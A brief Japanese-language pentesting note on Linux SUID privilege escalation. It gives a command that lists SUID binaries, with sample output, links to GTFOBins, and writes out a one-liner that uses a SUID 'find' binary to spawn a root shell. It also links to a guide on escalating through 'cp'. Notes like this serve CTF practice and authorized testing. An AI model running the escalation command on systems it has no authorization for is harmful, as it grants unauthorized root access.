# SUID

* SUIDが付与されいているコマンドを列挙する

  ```bash
  find / -perm -u=s -type f 2>/dev/null
  
  /bin/umount
  /bin/su
  /bin/mount
  /usr/bin/passwd
  /usr/bin/newgrp
  /usr/bin/chsh
  /usr/bin/gpasswd
  /usr/bin/find
  /usr/bin/chfn
  /usr/bin/gawk
  /usr/bin/vim.basic
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/openssh/ssh-keysign
  ```

* 以下のサイトから特権昇格可能かどうかを確認する

  https://gtfobins.github.io/gtfobins/find/

  ```bash
  find . -exec /bin/sh -p \; -quit
  ```

  

* cpコマンドのSUIDでの特権昇格方法

  https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/